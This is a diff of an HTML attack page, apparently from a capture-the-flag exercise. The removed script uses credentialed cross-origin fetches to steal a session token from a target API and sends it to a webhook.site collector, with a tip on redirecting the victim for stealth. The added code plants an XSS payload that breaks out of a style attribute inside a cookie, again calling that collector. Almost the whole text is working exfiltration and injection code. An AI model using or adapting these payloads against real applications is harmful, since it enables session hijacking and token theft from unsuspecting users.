@@ -5,63 +5,22 @@
     <title>Loading...</title>
 </head>
 <body>
-    <h1>Please wait...</h1>
+    <h1>Attempting to set cookie... (This will fail)</h1>
     <script>
-        (async function() {
-            // Your Webhook Collector URL from webhook.site or a similar service
-            const WEBHOOK_COLLECTOR_URL = 'https://webhook.site/b4abd1fb-47ec-4090-8636-84f59d07b0f5';
-            
-            // The URL of the target endpoint on the vulnerable application
-            const TARGET_API_URL = 'https://localhost:1337/api/dev';
-
-            try {
-                // --- Step 1: Fetch the token from the target API ---
-                // The 'credentials: "include"' option is CRITICAL.
-                // It tells the browser to automatically include cookies (like the
-                // next-auth session cookie) in this cross-origin request.
-                const response = await fetch(TARGET_API_URL, {
-                    method: 'GET',
-                    credentials: 'include' 
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Target API responded with status: ${response.status}`);
-                }
-
-                // The endpoint returns the token payload as JSON
-                const tokenData = await response.json();
-
-                // --- Step 2: Exfiltrate (send) the captured token data to your collector ---
-                await fetch(WEBHOOK_COLLECTOR_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    // We wrap the captured data in another object for clarity
-                    body: JSON.stringify({
-                        message: "Successfully exfiltrated token from bot",
-                        capturedToken: tokenData,
-                        origin: window.location.href
-                    })
-                });
-
-                // Optional: For stealth, you could redirect the bot somewhere else
-                // window.location.href = "https://google.com";
-
-            } catch (error) {
-                // If something goes wrong (like a CORS error), send the error message
-                // to your collector so you can debug what happened.
-                await fetch(WEBHOOK_COLLECTOR_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        message: "Failed to exfiltrate token",
-                        error: error.message,
-                        origin: window.location.href
-                    })
-                });
+        // The malicious payload we want to inject
+        const maliciousStyleObject = {
+            enabled: true,
+            style: {
+                // This is the XSS payload, designed to break out of the style attribute
+                textShadow: 'dummy;"> <script>fetch("https://webhook.site/b4abd1fb-47ec-4090-8636-84f59d07b0f5");</script> <span style="'
             }
-        })();
+        };
+
+        const maliciousCookieValue = encodeURIComponent(JSON.stringify(maliciousStyleObject));
+        document.cookie = `pride_mode=${maliciousCookieValue}; domain=vulnerable-app.com; path=/; SameSite=None; Secure`;
+
+        console.log("Attempted to set cookie for vulnerable-app.com. Check the browser's cookie storage for that domain to confirm failure.");
+
     </script>
 </body>
 </html>
